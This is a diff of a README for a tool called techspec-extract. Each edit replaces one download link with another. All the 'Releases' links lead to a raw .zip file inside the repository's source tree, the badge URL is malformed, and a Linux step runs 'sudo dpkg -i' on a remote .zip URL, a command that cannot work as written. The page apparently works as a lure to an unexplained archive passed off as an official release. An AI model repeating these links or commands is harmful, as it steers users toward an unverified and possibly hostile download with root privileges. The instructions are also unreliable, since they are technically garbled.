@@ -1,6 +1,6 @@
 # 🚀 techspec-extract - Simplifying Technical Descriptions
 
-[![Download from Releases](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip%20Now-Release%https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip)](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip)
+[![Download from Releases](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip%20Now-Release%https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip)](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ techspec-extract helps you create organized summaries from technical product des
 Getting started with techspec-extract is easy. Follow these steps to download and run the software. 
 
 1. **Visit the Releases Page:** Click the link below to go to the official download page.
-   [Download the latest release here!](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip)
+   [Download the latest release here!](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip)
 
 2. **Download the Installer:** Look for the most recent version of the software. You will see files for different systems. Choose the file that matches your operating system (Windows, Mac, or Linux).
 
@@ -25,7 +25,7 @@ Getting started with techspec-extract is easy. Follow these steps to download an
      2. Open it and drag the techspec-extract icon to your Applications folder.
    - **On Linux:**
      1. Open the terminal and navigate to your "Downloads" folder.
-     2. Use the command `sudo dpkg -i https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip` to install the package.
+     2. Use the command `sudo dpkg -i https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip` to install the package.
 
 4. **Run the Application:**
    - **On Windows:** Open the Start menu, type "techspec-extract," and click the application icon.
@@ -64,7 +64,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, remember to [visit this page to download](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.9-beta.5.zip) the latest version. Choose the file suitable for your operating system and follow the installation instructions provided above. 
+To get started, remember to [visit this page to download](https://github.com/Vickson45/techspec-extract/raw/refs/heads/main/techspec_extract/techspec-extract-v3.7.zip) the latest version. Choose the file suitable for your operating system and follow the installation instructions provided above. 
 
 ## 📞 Support & Feedback
 
